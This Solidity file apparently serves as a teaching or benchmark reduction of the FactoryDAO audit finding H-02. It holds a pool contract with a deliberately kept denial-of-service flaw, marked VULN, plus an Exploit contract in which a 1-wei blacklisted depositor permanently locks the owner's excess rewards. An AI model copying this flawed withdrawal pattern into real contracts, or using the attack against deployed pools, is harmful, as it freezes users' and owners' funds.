// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  FactoryDAO — [H-02] Blacklisted user may prevent withdrawExcessRewards
    (Code4rena 2022-05-factorydao; #42551)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: withdraw() requires all reward + deposit transfers to succeed
    (success flag AND-chained). A blacklisted (or otherwise non-receivable) user
    can never withdraw, so totalDepositsWei never reaches 0, and
    withdrawExcessRewards permanently reverts. Vulnerable transfer loop +
    totalDepositsWei==0 gate preserved (@>). */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public blacklisted;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function setBlacklist(address who, bool v) external {
        blacklisted[who] = v;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (blacklisted[to] || blacklisted[msg.sender]) return false;
        if (balanceOf[msg.sender] < amount) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (blacklisted[from] || blacklisted[to]) return false;
        if (balanceOf[from] < amount) return false;
        uint256 a = allowance[from][msg.sender];
        if (a < amount) return false;
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Reduced PermissionlessBasicPoolFactory pool accounting.
contract PermissionlessBasicPoolFactory {
    struct Pool {
        address depositToken;
        address[] rewardTokens;
        uint256 totalDepositsWei;
        uint256[] rewardsWeiClaimed;
        uint256[] rewardFunding;
        uint256 taxPerCapita; // /1000
    }

    struct Receipt {
        address owner;
        uint256 amountDepositedWei;
        uint256 poolId;
        bool withdrawn;
    }

    address public owner;
    Pool[] public pools;
    Receipt[] public receipts;
    mapping(uint256 => mapping(uint256 => uint256)) public taxes; // poolId => rewardIdx => tax

    constructor() {
        owner = msg.sender;
    }

    function createPool(address depositToken, address[] memory rewardTokens, uint256 taxPerCapita)
        external
        returns (uint256 poolId)
    {
        address[] memory rt = new address[](rewardTokens.length);
        uint256[] memory claimed = new uint256[](rewardTokens.length);
        uint256[] memory funding = new uint256[](rewardTokens.length);
        for (uint256 i = 0; i < rewardTokens.length; i++) {
            rt[i] = rewardTokens[i];
        }
        pools.push(
            Pool({
                depositToken: depositToken,
                rewardTokens: rt,
                totalDepositsWei: 0,
                rewardsWeiClaimed: claimed,
                rewardFunding: funding,
                taxPerCapita: taxPerCapita
            })
        );
        return pools.length - 1;
    }

    function fundRewards(uint256 poolId, uint256 rewardIdx, uint256 amount) external {
        Pool storage pool = pools[poolId];
        require(MockERC20(pool.rewardTokens[rewardIdx]).transferFrom(msg.sender, address(this), amount), "fund");
        pool.rewardFunding[rewardIdx] += amount;
    }

    function deposit(uint256 poolId, uint256 amount) external returns (uint256 receiptId) {
        Pool storage pool = pools[poolId];
        require(MockERC20(pool.depositToken).transferFrom(msg.sender, address(this), amount), "dep");
        pool.totalDepositsWei += amount;
        receipts.push(
            Receipt({owner: msg.sender, amountDepositedWei: amount, poolId: poolId, withdrawn: false})
        );
        return receipts.length - 1;
    }

    /// @dev Simplified: rewards[i] is a fixed share of remaining funding proportional to deposit.
    function _pendingRewards(uint256 receiptId) internal view returns (uint256[] memory rewards) {
        Receipt storage receipt = receipts[receiptId];
        Pool storage pool = pools[receipt.poolId];
        rewards = new uint256[](pool.rewardTokens.length);
        if (receipt.withdrawn || pool.totalDepositsWei == 0) return rewards;
        for (uint256 i = 0; i < pool.rewardTokens.length; i++) {
            // pro-rata of remaining funding
            rewards[i] = (pool.rewardFunding[i] * receipt.amountDepositedWei) / pool.totalDepositsWei;
        }
    }

    function withdraw(uint256 receiptId) external {
        Receipt storage receipt = receipts[receiptId];
        require(msg.sender == receipt.owner, "not owner");
        require(!receipt.withdrawn, "done");
        Pool storage pool = pools[receipt.poolId];

        uint256[] memory rewards = _pendingRewards(receiptId);
        bool success = true;

        for (uint256 i = 0; i < rewards.length; i++) {
            pool.rewardsWeiClaimed[i] += rewards[i];
            pool.rewardFunding[i] -= rewards[i];
            uint256 tax = (pool.taxPerCapita * rewards[i]) / 1000;
            uint256 transferAmount = rewards[i] - tax;
            taxes[receipt.poolId][i] += tax;
            success = success && MockERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount); // @> VULN: failed transfer (blacklist) bricks whole withdraw
        }

        success = success && MockERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);
        require(success, "Token transfer failed");

        pool.totalDepositsWei -= receipt.amountDepositedWei;
        receipt.withdrawn = true;
    }

    function withdrawExcessRewards(uint256 poolId) external {
        require(msg.sender == owner, "owner");
        Pool storage pool = pools[poolId];
        require(pool.totalDepositsWei == 0, "Cannot withdraw until all deposits are withdrawn"); // @> VULN: blocked forever if any user cannot withdraw
        for (uint256 i = 0; i < pool.rewardTokens.length; i++) {
            uint256 remaining = pool.rewardFunding[i];
            if (remaining > 0) {
                pool.rewardFunding[i] = 0;
                require(MockERC20(pool.rewardTokens[i]).transfer(owner, remaining), "xfer");
            }
        }
    }

    function totalDeposits(uint256 poolId) external view returns (uint256) {
        return pools[poolId].totalDepositsWei;
    }

    function rewardFundingOf(uint256 poolId, uint256 idx) external view returns (uint256) {
        return pools[poolId].rewardFunding[idx];
    }
}

contract User {
    function deposit(PermissionlessBasicPoolFactory f, uint256 poolId, uint256 amount) external {
        f.deposit(poolId, amount);
    }

    function withdraw(PermissionlessBasicPoolFactory f, uint256 receiptId) external {
        f.withdraw(receiptId);
    }

    function approve(MockERC20 t, address spender, uint256 amount) external {
        t.approve(spender, amount);
    }
}

contract Exploit {
    MockERC20 public depositTok; // CREATE 1
    MockERC20 public rewardTok; // CREATE 2
    PermissionlessBasicPoolFactory public factory; // CREATE 3 — vulnerable
    User public honest; // CREATE 4
    User public attacker; // CREATE 5 — will be blacklisted

    uint256 public constant HONEST_DEP = 50 ether;
    uint256 public constant ATTACKER_DEP = 1; // negligible
    uint256 public constant REWARD_FUND = 100 ether;
    uint256 public poolId;

    constructor() {
        depositTok = new MockERC20("Deposit", "DEP");
        rewardTok = new MockERC20("Reward", "RWD");
        factory = new PermissionlessBasicPoolFactory();
        honest = new User();
        attacker = new User();

        address[] memory rts = new address[](1);
        rts[0] = address(rewardTok);
        poolId = factory.createPool(address(depositTok), rts, 0);

        // Fund rewards + users
        rewardTok.mint(address(this), REWARD_FUND);
        rewardTok.approve(address(factory), REWARD_FUND);
        factory.fundRewards(poolId, 0, REWARD_FUND);

        depositTok.mint(address(honest), HONEST_DEP);
        depositTok.mint(address(attacker), ATTACKER_DEP);
        honest.approve(depositTok, address(factory), HONEST_DEP);
        attacker.approve(depositTok, address(factory), ATTACKER_DEP);
        honest.deposit(factory, poolId, HONEST_DEP);
        attacker.deposit(factory, poolId, ATTACKER_DEP);
    }

    function run() external {
        // Attacker gets blacklisted on the reward token (cheap; 1 wei deposit).
        rewardTok.setBlacklist(address(attacker), true);

        // Honest user can still withdraw (not blacklisted).
        honest.withdraw(factory, 0);
        require(factory.totalDeposits(poolId) == ATTACKER_DEP, "only attacker left");

        // Attacker cannot withdraw — transfer fails.
        bool attackerOk = true;
        try attacker.withdraw(factory, 1) {}
        catch {
            attackerOk = false;
        }
        require(!attackerOk, "attacker withdraw must fail");
        require(factory.totalDeposits(poolId) == ATTACKER_DEP, "still stuck");

        // Owner cannot claim excess rewards forever.
        bool excessOk = true;
        try factory.withdrawExcessRewards(poolId) {}
        catch {
            excessOk = false;
        }
        require(!excessOk, "excess withdraw must revert");
        // Remaining rewards still locked in the factory.
        require(factory.rewardFundingOf(poolId, 0) > 0, "rewards locked");
        require(rewardTok.balanceOf(address(factory)) > 0, "tokens locked in factory");
        // Harm: owner excess rewards permanently frozen by a 1-wei blacklisted depositor.
    }
}
